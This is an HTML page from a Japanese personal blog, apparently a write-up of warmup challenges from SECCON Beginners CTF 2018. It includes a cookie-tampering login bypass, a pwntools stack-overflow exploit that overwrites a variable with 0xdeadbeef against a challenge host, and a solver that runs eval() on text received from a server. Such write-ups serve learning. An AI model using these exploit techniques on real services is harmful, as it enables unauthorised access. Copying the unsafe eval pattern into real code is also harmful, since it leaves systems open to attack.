@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+
+<meta itemprop="name" content="SECCON Beginners CTF 2018に参加した">
+<meta itemprop="description" content="SECCON Beginners CTF 2018に個人で参加した． CTF力が圧倒的に足りず，Warmupくらいしか解けなかった． [Warmup] plain mail pcapファイルの解析． 問題文を見るとわ">
+
+
+<meta itemprop="datePublished" content="2018-05-27T00:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2019-02-09T19:46:37&#43;09:00" />
+<meta itemprop="wordCount" content="2276">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta property="og:title" content="SECCON Beginners CTF 2018に参加した" />
+<meta property="og:description" content="SECCON Beginners CTF 2018に個人で参加した． CTF力が圧倒的に足りず，Warmupくらいしか解けなかった． [Warmup] plain mail pcapファイルの解析． 問題文を見るとわ" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mas9612.github.io/posts/seccon-begginners-ctf-2018/" />
+<meta property="article:published_time" content="2018-05-27T00:00:00&#43;09:00"/>
+<meta property="article:modified_time" content="2019-02-09T19:46:37&#43;09:00"/>
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SECCON Beginners CTF 2018に参加した"/>
+<meta name="twitter:description" content="SECCON Beginners CTF 2018に個人で参加した． CTF力が圧倒的に足りず，Warmupくらいしか解けなかった． [Warmup] plain mail pcapファイルの解析． 問題文を見るとわ"/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>SECCON Beginners CTF 2018に参加した</title>
+	<link rel="stylesheet" href="https://mas9612.github.io/css/style.min.e17a25802a5bbec7b5c368fdf0e55ed331a31cadbc95c1c0e7be9e9cf889b8fb.css" integrity="sha256-4XolgCpbvse1w2j98OVe0zGjHK28lcHA576enPiJuPs=">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp faster">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://mas9612.github.io/">mas9612&#39;s note</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					<a href="https://mas9612.github.io/posts/">Blog</a>
+					<a href="https://mas9612.github.io/aboutme/">AboutMe</a>
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://twitter.com/mas9612" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://github.com/mas9612" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://mas9612.github.io/posts/">Blog</a></li>
+			<li><a href="https://mas9612.github.io/aboutme/">AboutMe</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>May 27, 2018</span></div>
+				<h1>SECCON Beginners CTF 2018に参加した</h1>
+			</header>
+			<div class="content">
+				
+
+<p>SECCON Beginners CTF 2018に個人で参加した．
+CTF力が圧倒的に足りず，Warmupくらいしか解けなかった．</p>
+
+<h2 id="warmup-plain-mail">[Warmup] plain mail<a href="#warmup-plain-mail" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>pcapファイルの解析．
+問題文を見るとわかるように，pcapの中身を見るとSMTPの通信が多い．
+加えて，それらの通信には暗号化が施されていないため，平文で中身を見ることができる．</p>
+
+<p>というわけで，真面目にpcapファイルを見てもよいが，面倒なので <code>strings</code> コマンドで文字列を見てみる．
+すると，下記のように <code>encrypted.zip</code> というファイルをBase64エンコードして送信している箇所がある．</p>
+
+<pre><code>354 Enter message, ending with &quot;.&quot; on a line by itself
+kContent-Type: multipart/mixed; boundary=&quot;===============0309142026791669022==&quot;
+MIME-Version: 1.0
+Content-Disposition: attachment; filename=&quot;encrypted.zip&quot;
+--===============0309142026791669022==
+Content-Type: application/octet-stream; Name=&quot;encrypted.zip&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+UEsDBAoACQAAAOJVm0zEdBgeLQAAACEAAAAIABwAZmxhZy50eHRVVAkAA6f/4lqn/+JadXgLAAEE
+AAAAAAQAAAAASsSD0p8jUFIaCtIY0yp4JcP9Nha32VYd2BSwNTG83tIdZyU4x2VJTGyLcFquUEsH
+CMR0GB4tAAAAIQAAAFBLAQIeAwoACQAAAOJVm0zEdBgeLQAAACEAAAAIABgAAAAAAAEAAACkgQAA
+AABmbGFnLnR4dFVUBQADp//iWnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE4AAAB/AAAAAAA=
+--===============0309142026791669022==--
+</code></pre>
+
+<p>明らかに怪しいので，とりあえずこれを復元してみる．
+Base64エンコードされている文字列のみを持ってきて，それをPythonでデコード，ファイルへの書き込みを行う．</p>
+
+<pre><code>import base64
+
+encoded = 'UEsDBAoACQAAAOJVm0zEdBgeLQAAACEAAAAIABwAZmxhZy50eHRVVAkAA6f/4lqn/+JadXgLAAEEAAAAAAQAAAAASsSD0p8jUFIaCtIY0yp4JcP9Nha32VYd2BSwNTG83tIdZyU4x2VJTGyLcFquUEsHCMR0GB4tAAAAIQAAAFBLAQIeAwoACQAAAOJVm0zEdBgeLQAAACEAAAAIABgAAAAAAAEAAACkgQAAAABmbGFnLnR4dFVUBQADp//iWnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE4AAAB/AAAAAAA='
+
+with open('encripted.zip', 'wb') as f:
+    f.write(base64.b64decode(encoded))
+</code></pre>
+
+<p>これを実行すると，zipファイルが復元される．
+復元されたzipファイルを解凍しようとすると，パスワードが求められる．
+メールの中にそれっぽい文字列がないかと探していると，先程のBase64データのあとに送られているメールの中に怪しいものがある．</p>
+
+<pre><code>mail FROM:&lt;me@4b.local&gt; size=13
+ 250 OK
+rcpt TO:&lt;you@4b.local&gt;
+!250 Accepted
+data
+!354 Enter message, ending with &quot;.&quot; on a line by itself
+_you_are_pro_
+</code></pre>
+
+<p>ためしに <code>_you_are_pro_</code> をパスワードとして解凍してみると，うまく解凍できて， <code>flag.txt</code> というファイルが出てくる．
+その内容がフラグとなっている．</p>
+
+<pre><code>$ cat flag.txt
+ctf4b{email_with_encrypted_file}
+</code></pre>
+
+<p>Flag: <code>ctf4b{email_with_encrypted_file}</code></p>
+
+<h2 id="warmup-greeting">[Warmup] Greeting<a href="#warmup-greeting" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>提示されているWebページに行くと，ユーザ名を入力するフォームと，ページのPHPソースが表示されている．
+PHPのソースを読むと， <code>username</code> という変数の内容が <code>admin</code> であったらフラグが表示されるようになっている．
+<code>username</code> はフォームに名前を入力することで変更できるが， <code>admin</code> を入力すると <code>偽管理者</code> に変更されるようになっているため，フォームからは <code>username</code> を <code>admin</code> に設定することができない．</p>
+
+<p>しかし，ソースをよく見ると，POSTで <code>name</code> を送信していない場合はCookieの中にある <code>name</code> を参照するようになっている．
+さらに，Cookieで <code>name</code> を <code>admin</code> に設定した場合は <code>偽管理者</code> に変更されるようなロジックは実装されていない．
+そのため，POSTで何も送らず，Cookieの <code>name</code> に <code>admin</code> を設定してページにアクセスするとフラグをゲットできる．</p>
+
+<p>Flag: <code>ctf4b{w3lc0m3_TO_ctf4b_w3b_w0rd!!}</code></p>
+
+<h2 id="warmup-simple-auth">[Warmup] Simple Auth<a href="#warmup-simple-auth" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>ダウンロードしたバイナリを実行してみると，パスワードが求められる．
+入力したパスワードが正しければFlagが表示されそうな感じ．
+<code>strcmp</code> 等で判定しているのでは，と予想して， <code>ltrace</code> コマンドを使って実行してみる．
+すると，入力した文字列と <code>ctf4b{rev3rsing_p4ssw0rd}</code> の文字列を求めている箇所が見つかる．
+これらの文字列長が等しければFlagが表示されるように推測できるので，同じ文字列を与えてあげる．
+すると，Flagが表示される（さっき見つけた文字列と同じ）．</p>
+
+<pre><code>$ ltrace ./simple_auth
+...
+strlen(&quot;aiueo&quot;)                                                                        = 5
+strlen(&quot;ctf4b{rev3rsing_p4ssw0rd}&quot;)                                                    = 25
+...
+
+$ ./simple_auth
+Input Password: ctf4b{rev3rsing_p4ssw0rd}
+Auth complite!!
+Flag is ctf4b{rev3rsing_p4ssw0rd}
+</code></pre>
+
+<p>Flag: <code>ctf4b{rev3rsing_p4ssw0rd}</code></p>
+
+<h2 id="warmup-condition">[Warmup] condition<a href="#warmup-condition" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>バイナリを実行してみると，名前の入力を求められる．
+<code>strace</code> や <code>ltrace</code> でみても大した情報は得られなかったので， <code>objdump</code> でmainの部分を見てみる．</p>
+
+<p>アセンブリを見てみると， <code>0x40079b</code> で <code>gets</code> 関数を呼び出し，標準入力から受け取った文字列を <code>rbp-0x30</code> に格納している．
+その後， <code>cmp</code> で <code>rbp-0x4</code> に入っている文字列と <code>0xdeadbeef</code> とを比較し，等しい場合のみその先にある <code>read_file</code> 関数を実行している．
+<code>read_file</code> の中身を見ると，この中でファイルオープンと標準出力への書き込みを行っているようである．</p>
+
+<p><code>rbp-0x4</code> に <code>0xdeadbeef</code> を格納するには， <code>0x30 - 0x4 = 44</code> 個のパディングを先に入力し，その後に <code>0xdeadbeef</code> を書き込んであげれば良い．
+これらをもとに，フラグを得るためのプログラムを作成する．</p>
+
+<pre><code># -*- coding: utf-8 -*-
+
+from pwn import *
+
+string = 'deadbeef'
+sendmsg = 'a' * 44 + '\xef\xbe\xad\xde' + '\n'
+
+host = 'pwn1.chall.beginners.seccon.jp'
+port = 16268
+c = remote(host, port)
+
+c.recvuntil('Please tell me your name...')
+c.send(sendmsg)
+print(c.recv())
+print(c.recv())
+</code></pre>
+
+<p>これを実行すると，フラグをゲットできる．</p>
+
+<pre><code>$ python solve.py
+[+] Opening connection to pwn1.chall.beginners.seccon.jp on port 16268: Done
+OK! You have permission to get flag!!
+
+ctf4b{T4mp3r_4n07h3r_v4r14bl3_w17h_m3m0ry_c0rrup710n}
+
+[*] Closed connection to pwn1.chall.beginners.seccon.jp port 16268
+</code></pre>
+
+<h2 id="warmup-veni-vidi-vici">[Warmup] Veni, vidi, vici<a href="#warmup-veni-vidi-vici" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>ダウンロードしたzipファイルを解凍すると，part1からpart3までのファイルが入っている．
+中身を見てみると，part1とpart2はそれぞれ何らかの暗号で暗号化されている．</p>
+
+<p>part1は，ROT13で暗号化されているようなので，Pythonで復号する．</p>
+
+<pre><code># -*- coding: utf-8 -*-
+
+import codecs
+
+with open('veni_vidi_vici/part1', 'r') as f:
+    text = f.read().strip()
+
+print(codecs.decode(text, 'rot13'))
+</code></pre>
+
+<p>part2は，それぞれの文字が8個ずつずれているので，これもPythonで復号．</p>
+
+<pre><code># -*- coding: utf-8 -*-
+
+import string
+
+
+with open('veni_vidi_vici/part2', 'r') as f:
+    text = f.read().strip()
+
+for c in text:
+    if c in string.ascii_lowercase:
+        plain = chr((ord(c) - ord('a') + 8) % 26 + ord('a'))
+    elif c in string.ascii_uppercase:
+        plain = chr((ord(c) - ord('A') + 8) % 26 + ord('A'))
+    else:
+        plain = c
+
+    print(plain, end='')
+print()
+</code></pre>
+
+<p>part3は，Unicodeを使って(?)すべての文字が上下逆さまになっている．
+なので，普通に目で読む．</p>
+
+<p>これらを結合するとFlagとなる．</p>
+
+<p>Flag: <code>ctf4b{n0more_cLass!cal_cRypt0graphy}</code></p>
+
+<h2 id="bbs">bbs<a href="#bbs" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<ul>
+<li>バイナリを実行すると，文字列の入力を求められる．</li>
+<li>何らかの文字列を入力すると，現在時刻とともに先程入力した内容が表示され，プログラムが終了する．</li>
+<li>試しに長い文字列を入力すると，Segmentation Faultが発生する．</li>
+<li>Segmentation Faultがおこらないギリギリの長さを探すと，135文字までは正常に入力が受け付けられることがわかる
+
+<ul>
+<li>改行文字を含めて136文字目？</li>
+</ul></li>
+<li>checksec.shを使ってバイナリ情報を確認すると，Stack Canaryがない事がわかる
+
+<ul>
+<li>Stack Overflowができそう</li>
+</ul></li>
+</ul>
+
+<pre><code>$ checksec --file ./bbs
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No      0               4       ./bbs
+</code></pre>
+
+<ul>
+<li>結局解けていない</li>
+</ul>
+
+<h2 id="てけいさんえくすとりーむず">てけいさんえくすとりーむず<a href="#てけいさんえくすとりーむず" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>とりあえずncで接続してみると，ひたすら計算をしていくだけのよう．
+おそらくすべての問題を解けたらFlagが貰えそうなので，雑にプログラムを書いて実行する．</p>
+
+<pre><code># -*- coding: utf-8 -*-
+
+import re
+from pwn import *
+
+
+host = 'tekeisan-ekusutoriim.chall.beginners.seccon.jp'
+port = 8690
+
+c = remote(host, port)
+
+for i in xrange(11):
+    c.readline()
+
+regex = re.compile(r'^\(Stage.\d+\))
+
+while True:
+    string = c.readline().strip()
+
+    if regex.match(string):
+        print string
+        problem = c.readuntil('=').split('=')[0]
+        print problem
+        answer = eval(problem)
+        print(answer)
+        c.send(str(answer) + '\n')
+    else:
+        print c.read()
+</code></pre>
+
+<p>これを実行するとFlagがもらえた．</p>
+
+<pre><code>$ python solve.py
+[+] Opening connection to tekeisan-ekusutoriim.chall.beginners.seccon.jp on port 8690: Done
+(Stage.1)
+708 + 910
+1618
+...
+Flag is: &quot;ctf4b{ekusutori-mu&gt;tekeisann&gt;bigina-zu&gt;2018}&quot;
+</code></pre>
+
+<p>Flag: <code>ctf4b{ekusutori-mu&gt;tekeisann&gt;bigina-zu&gt;2018}</code></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2276 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2018-05-26 15:00 &#43;0000</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="next-post" href="https://mas9612.github.io/posts/ryu-openflow-01/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;Newer</span><br><span>RyuによるOpenFlow入門 (1)</span>
+			</a>
+			<a class="prev-post" href="https://mas9612.github.io/posts/first-docker-engine-api/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Docker Engine API試用</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2019 <a href="https://mas9612.github.io/">Masato Yamazaki</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://mas9612.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+	<script src="https://mas9612.github.io/js/main.min.8f39f24808e9d0a9b02da58c2d2838da859dc0b7bdfadbdb1883aae8b6adacfe.js" integrity="sha256-jznySAjp0KmwLaWMLSg42oWdwLe9+tvbGIOq6LatrP4="></script>
+
+</body>
+
+</html>
